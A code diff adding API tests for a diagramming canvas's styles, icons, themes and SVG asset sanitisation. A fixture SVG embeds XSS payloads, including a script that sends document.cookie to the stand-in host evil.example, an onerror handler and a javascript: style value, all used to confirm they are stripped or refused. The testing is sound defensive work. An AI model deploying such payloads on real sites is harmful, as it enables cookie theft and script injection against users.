@@ -425,3 +425,93 @@ describe('placing and editing through operations', () => {
     expect(body.edges[0]).toMatchObject({ label: 'then', fromSide: 'bottom', toSide: 'top' });
   });
 });
+
+describe('styles, icons and theme through the API', () => {
+  const MALICIOUS_SVG =
+    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24" onload="alert(1)">' +
+    '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' +
+    '<foreignObject><img src="x" onerror="alert(2)"/></foreignObject>' +
+    '<image xlink:href="https://evil.example/track.png"/>' +
+    '<circle cx="12" cy="12" r="10" fill="url(https://evil.example/p)" stroke="#0090ff"/></svg>';
+
+  it('applies styles, icons, edge styles and a theme as one version, and reads them back', async () => {
+    const artifact = await publishBoard();
+    const response = await ops(owner, artifact, {
+      baseVersion: 1,
+      ops: [
+        { op: 'addAsset', tempId: 'logo', svg: MALICIOUS_SVG, name: 'Logo' },
+        { op: 'update', id: 'n1', set: { kite: { style: { fill: '#e6f4ff', borderColor: '5', radius: 12, font: 'inter', fontWeight: 600 }, icon: { name: 'lucide:server', position: 'left' } } } },
+        { op: 'update', id: 'n2', set: { kite: { icon: { name: 'asset:logo', position: 'top', size: 48 } } } },
+        { op: 'update', id: 'g1', set: { kite: { style: { labelFont: 'grotesk', labelSize: 20 } } } },
+        { op: 'update', id: 'e1', set: { color: '#0090ff', toEnd: 'arrow', kite: { style: { width: 2, line: 'dashed', curve: 'step' } } } },
+        { op: 'theme', set: { background: '#fafaf7', grid: 'lines', edge: { color: '#71717a' } } },
+      ],
+    });
+    expect(response.status).toBe(200);
+    const result = (await response.json()) as OpsResult;
+    expect(result.version).toBe(2);
+
+    const { body } = await readCanvas(owner, artifact);
+    const assetId = result.ids.logo!;
+    const svg = (body.kite as unknown as { assets: Record<string, { svg: string; name: string }> }).assets[assetId]!;
+    expect(svg.name).toBe('Logo');
+    expect(svg.svg).toBe('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#0090ff"/></svg>');
+    expect((body.kite as unknown as { theme: unknown }).theme).toEqual({ background: '#fafaf7', grid: 'lines', edge: { color: '#71717a' } });
+    expect(body.kite.version).toBe(2);
+    const n2 = body.nodes.find((n) => n.id === 'n2')!;
+    expect(n2.kite?.icon).toEqual({ name: `asset:${assetId}`, position: 'top', size: 48 });
+    expect(body.edges[0]).toMatchObject({ color: '#0090ff', toEnd: 'arrow', kite: { style: { width: 2, line: 'dashed', curve: 'step' } } });
+
+    const strict = await readCanvas(owner, artifact, '?format=jsoncanvas-strict');
+    const text = JSON.stringify(strict.body);
+    expect(text).not.toContain('kite');
+    expect(text).not.toContain('svg');
+    expect(Object.keys(strict.body)).toEqual(['nodes', 'edges']);
+  });
+
+  it('sanitises an SVG that arrives in a published or replaced document too', async () => {
+    const artifact = await publishBoard({
+      ...BOARD,
+      nodes: BOARD.nodes.map((n) => (n.id === 'n1' ? { ...n, kite: { icon: { name: 'asset:a1' } } } : n)),
+      kite: { assets: { a1: { type: 'svg', svg: MALICIOUS_SVG } } },
+    });
+    const { body } = await readCanvas(owner, artifact);
+    const stored = JSON.stringify(body);
+    expect(stored).not.toContain('evil.example');
+    expect(stored).not.toContain('script');
+    expect(stored).not.toContain('onload');
+    expect(stored).not.toContain('foreignObject');
+  });
+
+  it('refuses an unknown Lucide icon, an unusable SVG, and a bad style, writing nothing', async () => {
+    const artifact = await publishBoard();
+    const cases: Array<[unknown, RegExp]> = [
+      [{ op: 'update', id: 'n1', set: { kite: { icon: { name: 'lucide:not-an-icon-at-all' } } } }, /no Lucide icon "not-an-icon-at-all"/],
+      [{ op: 'addAsset', svg: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' }, /Nothing is left to draw/],
+      [{ op: 'addAsset', svg: '<!DOCTYPE svg [<!ENTITY x "y">]><svg><text>&x;</text></svg>' }, /defines its own entities/],
+      [{ op: 'update', id: 'n1', set: { kite: { style: { fill: 'javascript:alert(1)' } } } }, /fill must be a preset/],
+      [{ op: 'update', id: 'e1', set: { kite: { style: { curve: 'spline' } } } }, /curve must be one of/],
+      [{ op: 'theme', set: { background: 'url(https://evil.example)' } }, /background must be a preset/],
+    ];
+    for (const [op, message] of cases) {
+      const response = await ops(owner, artifact, { baseVersion: 1, ops: [op] });
+      expect(response.status, message.source).toBe(400);
+      expect((await error(response)).message).toMatch(message);
+    }
+    const unknownOnPublish = await owner.as(
+      '/api/artifacts',
+      jsonBody({ type: 'canvas', content: JSON.stringify({ nodes: [{ ...BOARD.nodes[1], kite: { icon: { name: 'lucide:nope-nope' } } }] }) }),
+    );
+    expect(unknownOnPublish.status).toBe(400);
+    const { body } = await readCanvas(owner, artifact);
+    expect(body.kite.version).toBe(1);
+  });
+
+  it('refuses an SVG over the size cap', async () => {
+    const artifact = await publishBoard();
+    const big = `<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/>${'<rect width="1" height="1"/>'.repeat(3000)}</svg>`;
+    const response = await ops(owner, artifact, { baseVersion: 1, ops: [{ op: 'addAsset', svg: big }] });
+    expect(response.status).toBe(400);
+    expect((await error(response)).message).toMatch(/can be up to 64 KB/);
+  });
+});
